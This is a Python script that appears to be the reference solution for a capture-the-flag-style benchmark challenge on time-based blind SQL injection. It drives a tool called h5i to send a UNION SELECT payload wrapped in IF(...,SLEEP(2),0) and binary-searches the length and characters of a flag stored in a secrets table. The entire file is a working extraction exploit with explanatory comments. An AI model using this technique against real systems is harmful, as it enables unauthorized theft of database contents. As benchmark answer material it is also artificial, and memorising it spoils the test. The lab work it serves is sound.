#!/usr/bin/env python3
"""APEX-005-25 — "Blind SQL Injection (Time-Based)" (tags: sqli, blind).

`/api/search?q=` interpolates its argument into a `LIKE` and then catches every
exception, returning the same empty result for a syntax error, for no matches
and for a hundred matches. There is no error oracle and no boolean oracle. What
is left is the clock: `IF(<condition>, SLEEP(n), 0)` costs n seconds when the
condition holds and nothing when it does not.

This is a Python example rather than a shell one for the reason W10 of
h5i's `design-websec.md` gives: a blind extraction is a loop with state, seven
sends per character, and shell stops being the right tool for it.

The measurement comes from h5i rather than from this process. Every send is
reported with the milliseconds it took, and `--repeat` sends inside the engine
rather than out here, which matters because a `time.time()` around a subprocess
measures the subprocess: starting one costs tens of milliseconds and the
question being asked is worth two thousand.
"""

import json
import os
import subprocess
import sys

H5I = os.environ.get("H5I", "h5i")
SESSION = f"apex005-{os.getpid()}"
SLEEP = 2          # seconds the condition costs when it holds
REPEATS = 1        # sends per question; raise it on a loaded machine
THRESHOLD = 1_500  # milliseconds above which the answer is yes


def h5i(*args):
    done = subprocess.run(
        [H5I, *args], capture_output=True, text=True, check=False
    )
    if done.returncode != 0:
        sys.exit(f"h5i {' '.join(args)} failed: {done.stderr.strip()}")
    return done.stdout


def slow(condition):
    """Milliseconds one asking of the question took."""
    # The visible query selects five columns, so the injected UNION selects
    # five too, and the first of them is where the sleep goes.
    payload = (
        f"test' UNION SELECT IF({condition},SLEEP({SLEEP}),0),'x','y',1,'z'-- -"
    )
    reply = json.loads(
        h5i("websec", "replay", "req_0", "--session", SESSION,
            "--repeat", str(REPEATS), "--reset-budget",
            "--set", f"query.q={payload}")
    )
    # The median of the sends, which for one send is that send. `--repeat`
    # above two also reports a `timing` block of its own; taking it from the
    # samples keeps this one line true at every repeat count.
    took = sorted(sample["total_ms"] for sample in reply["samples"])
    return took[len(took) // 2]


def ask(condition, tries=3):
    """True when the database took the slow branch.

    A yes and a no are not equally trustworthy here, so they are not treated
    the same. A yes costs the full sleep and nothing else on this machine
    produces one, so one yes settles the question. A no is a request that came
    back fast, and a request can come back fast for reasons that have nothing
    to do with the answer — this workbench occasionally stalls a send and
    reports a short time for it, at a rate around one in fifteen, which over
    the couple of hundred questions a flag costs is several wrong characters
    with nothing in the output to mark them.

    So a no is asked again. It is nearly free: the whole point of a no is that
    it returns immediately.
    """
    for _ in range(tries):
        if slow(condition) >= THRESHOLD:
            return True
    return False


FLAG = "(SELECT flag FROM secrets WHERE key_name='ctf_flag')"


def length():
    """Binary search on the flag's length, over a range it cannot exceed."""
    low, high = 1, 128
    while low < high:
        middle = (low + high) // 2
        if ask(f"LENGTH({FLAG})<={middle}"):
            high = middle
        else:
            low = middle + 1
    return low


def character(position):
    """Binary search on one character's code point."""
    low, high = 32, 126
    while low < high:
        middle = (low + high) // 2
        if ask(f"ASCII(SUBSTRING({FLAG},{position},1))<={middle}"):
            high = middle
        else:
            low = middle + 1
    return chr(low)


def quoted(text):
    return "'" + text.replace("\\", "\\\\").replace("'", "''") + "'"


def extract():
    """The flag, read one character at a time and then checked as a whole.

    The check is not caution for its own sake. A timing oracle answers a
    yes/no question with a stopwatch, and one answer that comes back on the
    wrong side of the line silently changes one character of the result — with
    nothing in the output to say which one. Asking the database whether the
    whole string is right costs one send and turns a plausible-looking wrong
    answer into a question that can be asked again.
    """
    size = length()
    found = [character(at) for at in range(1, size + 1)]

    for _ in range(4):
        if ask(f"{FLAG}={quoted(''.join(found))}"):
            return "".join(found)
        # Find the characters the database disagrees with, and read them again.
        for at, letter in enumerate(found, start=1):
            if not ask(f"SUBSTRING({FLAG},{at},1)={quoted(letter)}"):
                found[at - 1] = character(at)
    return None


def main():
    if len(sys.argv) < 2:
        sys.exit(f"usage: {sys.argv[0]} http://127.0.0.1:PORT")
    url = sys.argv[1].rstrip("/")

    h5i("browser", "open", f"{url}/api/search?q=laptop",
        "--session", SESSION, "--new", "--capture")
    try:
        # Confirm the oracle before trusting it. Without this a target that is
        # merely slow reads as a flag of 128 spaces.
        if not ask("1=1"):
            sys.exit("no timing oracle: the sleep did not show up in the clock")

        found = extract()
        print(found if found else "the database never agreed with what was read")
    finally:
        subprocess.run([H5I, "browser", "close", "--session", SESSION],
                       capture_output=True, check=False)


if __name__ == "__main__":
    main()
